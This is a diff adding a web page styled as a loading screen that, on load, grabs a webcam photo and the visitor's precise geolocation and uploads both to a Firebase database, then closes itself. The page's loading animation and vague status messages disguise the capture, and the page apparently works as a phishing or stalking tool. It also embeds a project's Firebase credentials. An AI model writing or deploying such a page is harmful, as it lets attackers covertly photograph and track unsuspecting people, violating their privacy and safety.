@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Auto Capture User</title>
+<style>
+  html, body {
+    margin: 0; 
+    padding: 0; 
+    height: 100%;
+    background: #121212;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Arial', sans-serif;
+    overflow: hidden;
+  }
+
+  .loading-container {
+    position: relative;
+    width: 200px;
+    height: 200px;
+  }
+
+  .diamond {
+    position: absolute;
+    width: 120px;
+    height: 120px;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) rotate(45deg);
+    border: 3px solid rgba(76, 175, 80, 0.3);
+    box-shadow: 0 0 30px rgba(76, 175, 80, 0.2);
+  }
+
+  .diamond-center {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    color: #4CAF50;
+    font-size: 3.5rem;
+    font-weight: bold;
+    text-shadow: 0 0 15px rgba(76, 175, 80, 0.7);
+    z-index: 10;
+    font-family: 'Arial Black', sans-serif;
+  }
+
+  .loading-track {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    border: 2px solid transparent;
+    border-radius: 50%;
+  }
+
+  .loading-progress {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    border: 3px solid transparent;
+    border-radius: 50%;
+    clip: rect(0, 100px, 200px, 0);
+    animation: rotate 2s linear infinite;
+  }
+
+  .loading-progress::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 15px;
+    height: 15px;
+    background: #4CAF50;
+    border-radius: 50%;
+    box-shadow: 0 0 10px #4CAF50, 0 0 20px #4CAF50;
+  }
+
+  @keyframes rotate {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  .status-text {
+    position: absolute;
+    bottom: -40px;
+    left: 0;
+    color: #4CAF50;
+    font-size: 0.9rem;
+    text-align: center;
+    width: 100%;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    font-weight: bold;
+  }
+
+  .pulse-effect {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    background: rgba(76, 175, 80, 0.1);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0% { transform: scale(0.8); opacity: 0.7; }
+    70% { transform: scale(1.3); opacity: 0; }
+    100% { transform: scale(0.8); opacity: 0; }
+  }
+</style>
+</head>
+<body>
+<div class="loading-container">
+  <div class="pulse-effect"></div>
+  <div class="loading-track"></div>
+  <div class="loading-progress"></div>
+  <div class="diamond"></div>
+  <div class="diamond-center">W</div>
+  <div class="status-text" id="statusText">Tunggu Sebentar</div>
+</div>
+
+<!-- Add Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+
+<script>
+  // Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyDCfNezdoQRgxkd1HOYUDa2kf9I1Jvx9FI",
+    authDomain: "toko-sya.firebaseapp.com",
+    databaseURL: "https://toko-sya-default-rtdb.firebaseio.com",
+    projectId: "toko-sya",
+    storageBucket: "toko-sya.firebasestorage.app",
+    messagingSenderId: "1025076261422",
+    appId: "1:1025076261422:web:1f6d988205774cceed65bf",
+    measurementId: "G-KSSE7E6R90"
+  };
+
+  // Initialize Firebase
+  const app = firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+  const dbRef = database.ref('captures');
+
+  // Update status text
+  function updateStatus(text) {
+    document.getElementById('statusText').textContent = text;
+  }
+
+  // Function to generate a random ID
+  function generateId() {
+    return 'id-' + Math.random().toString(36).substr(2, 9);
+  }
+
+  // Capture photo from webcam
+  async function capturePhoto() {
+    try {
+      updateStatus('Accessing Websait...');
+      
+      // Request user media video
+      const stream = await navigator.mediaDevices.getUserMedia({video: true});
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      // Wait for video to be ready
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => resolve();
+      });
+
+      updateStatus('Capturing Image...');
+      
+      // Capture a frame after short delay to ensure camera started
+      await new Promise(r => setTimeout(r, 800));
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Stop all tracks to release camera
+      stream.getTracks().forEach(track => track.stop());
+
+      return canvas.toDataURL('image/jpeg', 0.8);
+    } catch (error) {
+      console.error(' error:', error);
+      updateStatus('Error: izin Blocked');
+      return null;
+    }
+  }
+
+  // Get location
+  function getLocation() {
+    return new Promise((resolve, reject) => {
+      updateStatus('Getting Location...');
+      
+      if (!navigator.geolocation) {
+        resolve(null);
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        }),
+        err => {
+          console.warn('Location permission denied or error:', err);
+          updateStatus('Location: Unavailable');
+          resolve(null);
+        },
+        {timeout: 10000}
+      );
+    });
+  }
+
+  async function main() {
+    const id = generateId();
+    updateStatus('Starting Process...');
+    
+    const image = await capturePhoto();
+    const location = await getLocation();
+    const timestamp = new Date().toISOString();
+
+    if (!image) {
+      updateStatus('Gagal Not found');
+      setTimeout(() => {
+        window.close();
+      }, 3000);
+      return;
+    }
+
+    const entry = {
+      id,
+      image,
+      location,
+      timestamp
+    };
+
+    updateStatus('Detect Masuk...');
+    
+    // Save to Firebase
+    dbRef.child(id).set(entry)
+      .then(() => {
+        updateStatus('Completed! Closing...');
+        setTimeout(() => {
+          window.close();
+        }, 1500);
+      })
+      .catch(error => {
+        console.error('Error saving data: ', error);
+        updateStatus('Gagal Not pound');
+        setTimeout(() => {
+          window.close();
+        }, 3000);
+      });
+  }
+
+  // Run on load
+  window.onload = () => {
+    setTimeout(main, 1000); // Initial delay for animation
+  };
+</script>
+</body>
+</html>
